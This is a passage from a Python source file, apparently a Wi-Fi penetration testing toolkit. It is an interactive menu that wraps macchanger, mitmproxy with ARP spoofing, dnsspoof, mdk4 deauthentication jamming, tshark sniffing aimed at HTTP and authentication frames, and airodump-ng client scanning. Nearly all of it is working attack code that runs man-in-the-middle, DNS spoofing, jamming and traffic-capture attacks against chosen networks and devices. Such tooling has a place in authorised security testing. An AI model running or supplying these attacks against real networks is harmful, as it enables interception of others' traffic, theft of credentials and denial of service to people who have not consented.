            print(f"[*] Setting MAC address to {mac}...")
            subprocess.run(["macchanger", "-m", mac, selected_interface], check=False)
        else:
            print("[*] Resetting to original MAC address...")
            subprocess.run(["macchanger", "-p", selected_interface], check=False)
        
        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
        print(f"[+] New MAC address: {get_interface_mac(selected_interface)}")
        
    except Exception as e:
        print(f"[!] Error changing MAC address: {e}")
        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)

def mitm_proxy():
    if not check_interface_selected():
        return
    
    print("\n[*] MITM Proxy Attack Setup")
    
    print("[*] This attack requires ARP spoofing to redirect traffic")
    run_arp = input("Run ARP spoofing first? (y/n) [y]: ").strip().lower() or "y"
    
    if run_arp == "y":
        arp_spoofing()
    
    print("\n[*] Setting up MITM proxy...")
    
    proxy_port = input("Enter proxy port [8080]: ").strip() or "8080"
    
    try:
        print("[*] Starting mitmproxy...")
        mitmproxy_cmd = ["mitmproxy", "-p", proxy_port, "--mode", "transparent"]
        
        process = subprocess.Popen(mitmproxy_cmd)
        current_processes.append(("mitmproxy", process))
        
        print(f"[+] MITM proxy running on port {proxy_port}")
        print("[*] Press Ctrl+C to stop")
        
        process.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping MITM proxy...")
    except Exception as e:
        print(f"[!] Error during MITM proxy setup: {e}")
    finally:
        stop_process("mitmproxy")
        print("[+] MITM proxy stopped")

def dns_spoof():
    if not check_interface_selected():
        return
    
    print("\n[*] DNS Spoofing Attack Setup")
    
    print("[*] This attack requires ARP spoofing to redirect traffic")
    run_arp = input("Run ARP spoofing first? (y/n) [y]: ").strip().lower() or "y"
    
    if run_arp == "y":
        arp_spoofing()
    
    target_domain = input("\nEnter domain to spoof (e.g., example.com): ").strip()
    if not target_domain:
        print("[!] Domain name is required")
        return
    
    redirect_ip = input("Enter IP to redirect to: ").strip()
    if not redirect_ip:
        print("[!] Redirect IP is required")
        return
    
    try:
        hosts_file = "spoofed_hosts.txt"
        with open(hosts_file, "w") as f:
            f.write(f"{target_domain} {redirect_ip}\n")
            
        print(f"[*] Starting DNS spoofing attack for {target_domain} -> {redirect_ip}...")
        dnsspoof_cmd = ["dnsspoof", "-f", hosts_file, "-i", selected_interface]
        
        process = subprocess.Popen(dnsspoof_cmd)
        current_processes.append(("dnsspoof", process))
        
        print("[+] DNS spoofing attack running")
        print("[*] Press Ctrl+C to stop")
        
        process.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping DNS spoofing attack...")
    except Exception as e:
        print(f"[!] Error during DNS spoofing: {e}")
    finally:
        stop_process("dnsspoof")
        if os.path.exists(hosts_file):
            os.remove(hosts_file)
        print("[+] DNS spoofing stopped")

def wifi_jamming():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Wi-Fi Jamming Setup using {selected_interface}...")
    
    print("\nJamming Options:")
    print("1. Jam all networks on a specific channel")
    print("2. Jam a specific access point")
    print("3. Jam all networks (channel hopping)")
    
    option = input("\nSelect option [1]: ").strip() or "1"
    
    packet_rate = input("\nEnter packet rate (packets per second, 100-5000) [1000]: ").strip() or "1000"
    try:
        packet_rate = int(packet_rate)
        if packet_rate < 100:
            packet_rate = 100
        elif packet_rate > 5000:
            packet_rate = 5000
    except:
        packet_rate = 1000
    
    try:
        if option == "1":
            channel = input("Enter channel to jam: ").strip()
            if not channel:
                print("[!] Channel is required")
                return
                
            print(f"[*] Setting channel to {channel}...")
            subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
            
            print("[*] Starting jamming on all networks on channel " + channel + "...")
            jam_cmd = [
                "mdk4", 
                selected_interface, 
                "d", 
                "-c", channel,
                "-s", str(packet_rate)
            ]
            
        elif option == "2":
            target_bssid = input("Enter target AP MAC address: ").strip()
            if not target_bssid:
                print("[!] Target MAC address is required")
                return
                
            channel = input("Enter channel of the target AP: ").strip()
            if not channel:
                print("[!] Channel is required for targeted jamming")
                return
                
            print(f"[*] Setting channel to {channel}...")
            subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
            
            with open("target_ap.lst", "w") as f:
                f.write(target_bssid + "\n")
                
            print("[*] Starting targeted jamming on " + target_bssid + "...")
            jam_cmd = [
                "mdk4", 
                selected_interface, 
                "d", 
                "-b", "target_ap.lst", 
                "-c", channel,
                "-s", str(packet_rate)
            ]
            
        else:  
            print("[*] Starting jamming on all networks (channel hopping)...")
            jam_cmd = [
                "mdk4", 
                selected_interface, 
                "d",
                "-s", str(packet_rate)
            ]
        
        print(f"\n[*] Running: {' '.join(jam_cmd)}")
        print("[*] Press Ctrl+C to stop jamming")
        
        process = subprocess.Popen(jam_cmd)
        current_processes.append(("mdk4", process))
        process.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping jamming...")
    except Exception as e:
        print(f"[!] Error during jamming: {e}")
    finally:
        stop_process("mdk4")
        if os.path.exists("target_ap.lst"):
            os.remove("target_ap.lst")
        print("[+] Jamming stopped")   

def wifi_packet_sniffing():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up packet sniffing on {selected_interface}...")
    
    channel = input("Enter channel to sniff (leave blank for all channels): ").strip()
    
    target_bssid = input("Enter target AP MAC address (leave blank to capture all): ").strip()
    
    print("\nSelect filter type:")
    print("1. HTTP traffic")
    print("2. Authentication data")
    print("3. Custom filter")
    print("4. All traffic")
    
    filter_choice = input("\nSelect option [4]: ").strip() or "4"
    
    output_file = input("Save captured packets to file? (leave blank for no): ").strip()
    
    try:
        command = ["tshark", "-i", selected_interface]
        
        if channel:
            print(f"[*] Setting channel to {channel}...")
            subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
        
        if filter_choice == "1":
            command.extend(["-Y", "http"])
        elif filter_choice == "2":
            command.extend(["-Y", "eapol or wlan.fc.type_subtype == 0x0b or wlan.fc.type_subtype == 0x01"])
        elif filter_choice == "3":
            custom_filter = input("Enter tshark filter expression: ").strip()
            command.extend(["-Y", custom_filter])
        
        if target_bssid:
            command.extend(["-Y", f"wlan.bssid == {target_bssid}"])
        
        if output_file:
            command.extend(["-w", f"{output_file}.pcap"])
        
        print(f"\n[*] Running: {' '.join(command)}")
        print("[*] Press Ctrl+C to stop sniffing")
        
        process = subprocess.Popen(command)
        current_processes.append(("tshark", process))
        process.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping packet sniffing...")
    except Exception as e:
        print(f"[!] Error during packet sniffing: {e}")
    finally:
        stop_process("tshark")
        print("[+] Packet sniffing stopped")

def scan_clients():
    """Scan for clients connected to a specific AP"""
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up client scan using {selected_interface}...")
    
    target_bssid = input("Enter target AP MAC address: ").strip()
    if not target_bssid:
        print("[!] AP MAC address is required")
        return
    
    channel = input("Enter channel of the target AP: ").strip()
    if channel:
        print(f"[*] Setting channel to {channel}...")
        subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
    
    print("\n[*] Scanning for clients (this may take a minute)...")
    print("[*] Press Ctrl+C to stop scanning")
    
    try:
        output_file = f"client_scan_{int(time.time())}"
        
        command = [
            "airodump-ng",
            "--bssid", target_bssid,
            "-w", output_file,
            "--output-format", "csv"
        ]
        
        if channel:
            command.extend(["-c", channel])
        
        command.append(selected_interface)
        
        process = subprocess.Popen(command)
        current_processes.append(("airodump-ng-clients", process))
        

        try:
            time.sleep(30)  
        except KeyboardInterrupt:
            pass  
        
        stop_process("airodump-ng-clients")
        
        csv_file = f"{output_file}-01.csv"
        if os.path.exists(csv_file):
            clients = parse_airodump_csv(csv_file, target_bssid)
            
            if clients:
                client_data = [["MAC Address", "First Seen", "Last Seen", "Power", "Packets"]]
                for client in clients:
                    client_data.append([
                        client.get("mac", "?"),
                        client.get("first_seen", "?"),
                        client.get("last_seen", "?"),
                        client.get("power", "?"),
                        client.get("packets", "?")
                    ])
                
                table = SingleTable(client_data)
                table.inner_row_border = True
                print("\n[+] Clients found:")
                print(table.table)
            else:
                print("\n[!] No clients found connected to this AP")
            
            for temp_file in os.listdir('.'):
                if temp_file.startswith(output_file):
                    os.remove(temp_file)
        else:
            print(f"[!] Error: Could not find scan results file {csv_file}")
        
    except Exception as e:
        print(f"[!] Error during client scan: {e}")
    finally:
        stop_process("airodump-ng-clients")

def parse_airodump_csv(csv_file, target_bssid):
    """Parse airodump-ng CSV file to extract client information"""
    clients = []
    client_section = False
    
    try:
        with open(csv_file, 'r') as f:
            for line in f:
                line = line.strip()
                
                if not line:
                    continue
                
                if "Station MAC" in line:
                    client_section = True
                    continue
                
                if client_section and "," in line and not line.startswith("BSSID"):
                    parts = line.split(',')
                    
                    if len(parts) >= 6 and target_bssid.lower() in parts[5].lower():
                        clients.append({
                            "mac": parts[0].strip(),
                            "first_seen": parts[1].strip(),
                            "last_seen": parts[2].strip(),
                            "power": parts[3].strip(),
                            "packets": parts[4].strip()
                        })
    
    except Exception as e:
        print(f"[!] Error parsing CSV file: {e}")
    
    return clients

def show_status():
    """Display current status of the application"""
    print("\n=== Current Status ===")
    
    if selected_interface:
        print(f"Selected Interface: {selected_interface}")
        print(f"Interface Mode: {get_interface_mode(selected_interface)}")
        print(f"MAC Address: {get_interface_mac(selected_interface)}")
        print(f"Status: {'Up' if is_interface_up(selected_interface) else 'Down'}")
    else:
        print("No interface selected")
    
    if current_processes:
        print("\nRunning Processes:")
        for name, process in current_processes:
            if process.poll() is None:  
                print(f"- {name} (PID: {process.pid})")
    else:
        print("\nNo processes currently running")

def stop_all_processes():
    """Stop all running processes"""
    if not current_processes:
        print("\n[*] No processes to stop")
        return
    
    print("\n[*] Stopping all running processes...")
    
    for name, process in list(current_processes):
        stop_process(name)
    
    print("[+] All processes stopped")

def stop_process(name):
    """Stop a running process by name"""
    global current_processes
    
    to_remove = []
    for proc_name, process in current_processes:
        if proc_name == name:
            try:
                process.terminate()
                time.sleep(0.5)
                if process.poll() is None:  
                    process.kill()
                to_remove.append((proc_name, process))
            except Exception as e:
                print(f"[!] Error stopping {proc_name}: {e}")
    
    for item in to_remove:
        current_processes.remove(item)

def cleanup_and_exit():
    """Clean up before exiting the application"""
    stop_all_processes()
    
    if selected_interface and get_interface_mode(selected_interface) == "Monitor":
        print("[*] Restoring interface to managed mode...")
        wifi_managed_mode(silent=True)
    
    temp_files = ["hostapd.conf", "dnsmasq.conf"]
    for file in temp_files:
        if os.path.exists(file):
            os.remove(file)
    
    subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
    
    print("[+] Cleanup complete")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CyberNilsen's Advanced WiFi Penetration Testing Toolkit")
    parser.add_argument("-i", "--interface", help="Specify wireless interface to use")
    args = parser.parse_args()
    
    if args.interface:
        selected_interface = args.interface
    
    main()